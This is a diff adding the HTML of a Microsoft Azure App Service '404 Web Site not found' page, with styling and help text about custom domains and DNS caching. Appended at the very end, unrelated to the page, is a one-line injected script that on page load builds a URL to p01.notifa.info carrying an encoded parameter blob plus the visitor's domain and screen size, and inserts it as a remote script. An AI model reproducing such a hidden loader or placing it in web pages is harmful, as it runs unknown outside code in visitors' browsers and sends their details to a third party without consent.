@@ -1,0 +1,86 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>Microsoft Azure Web App - Error 404</title>
+    <style type="text/css">
+        html {
+            height: 100%;
+            width: 100%;
+        }
+
+        #feature {
+            width: 960px;
+            margin: 75px auto 0 auto;
+            overflow: auto;
+        }
+
+        #content {
+            font-family: "Segoe UI";
+            font-weight: normal;
+            font-size: 22px;
+            color: #ffffff;
+            float: left;
+            margin-top: 68px;
+            margin-left: 0px;
+            vertical-align: middle;
+        }
+
+            #content h1 {
+                font-family: "Segoe UI Light";
+                color: #ffffff;
+                font-weight: normal;
+                font-size: 60px;
+                line-height: 48pt;
+                width: 800px;
+            }
+
+        a, a:visited, a:active, a:hover {
+            color: #ffffff;
+        }
+
+        #content a.button {
+            background: #0DBCF2;
+            border: 1px solid #FFFFFF;
+            color: #FFFFFF;
+            display: inline-block;
+            font-family: Segoe UI;
+            font-size: 24px;
+            line-height: 46px;
+            margin-top: 10px;
+            padding: 0 15px 3px;
+            text-decoration: none;
+        }
+
+            #content a.button img {
+                float: right;
+                padding: 10px 0 0 15px;
+            }
+
+            #content a.button:hover {
+                background: #1C75BC;
+            }
+    </style>
+    <script type="text/javascript">
+        function toggle_visibility(id) {
+            var e = document.getElementById(id);
+            if (e.style.display == 'block')
+                e.style.display = 'none';
+            else
+                e.style.display = 'block';
+        }
+    </script>
+</head>
+<body bgcolor="#00abec">
+    <div id="feature">
+        <div id="content">
+            <h1>404 Web Site not found.</h1>
+            <p>You may be seeing this error due to one of the reasons listed below :</p>
+            <ul>
+                <li>Custom domain has not been configured inside Azure. See <a href="https://docs.microsoft.com/en-us/azure/app-service-web/app-service-web-tutorial-custom-domain">how to map an existing domain</a> to resolve this.</li>
+                <li>Client cache is still pointing the domain to old IP address. Clear the cache by running the command <i>ipconfig/flushdns.</i></li>
+            </ul>
+            <p>Checkout <a href="https://blogs.msdn.microsoft.com/appserviceteam/2017/08/08/faq-app-service-domain-preview-and-custom-domains/">App Service Domain FAQ</a> for more questions.</p>
+        </div>
+     </div>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAXtDQ2Qqoxy1VCZgMMD6yP9rPWyOGnFYPoaqbvNTsf7AthREqF6KVXIFDRstWBPnkBNDvZD0G7Z%2bKsnVvjCl26jnb6fMzYDwbywEK7tmxB9N40jAyqzQo9m5iAvIyo%2fn38KnsUrHqP5OXCZ1Dfpu9uuQJWcdYQGGhirMrSj3QJvk7IOha9sRmORksaedCuy4Akg%2bjUBJdB0xbY1Goic%2beGhjEhyU%2b4mwXSwb7ON1iqjTr4QtMNevVZ%2fUES%2fW%2b4nwbNAkwag4YDRJunhyDnAdICEnOdUdURra8XkMdfRSYjc81MYBn6wUH6GYlEIlqGvD94L7lhnUGjiblfLS7gcY1qgu0TpisNPywO3OyEBQUgYA89nyg8cYsh%2f5uP%2fmtLlw7EnBoNyytn4XOPt1inrHhOEYzRYl2XGiwmH12%2fdS955uS73uj7MtyQYlnJ0CUcpkqA2SahlHKdh0xT%2brMx5jbOzk%2fNcH05P8E" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
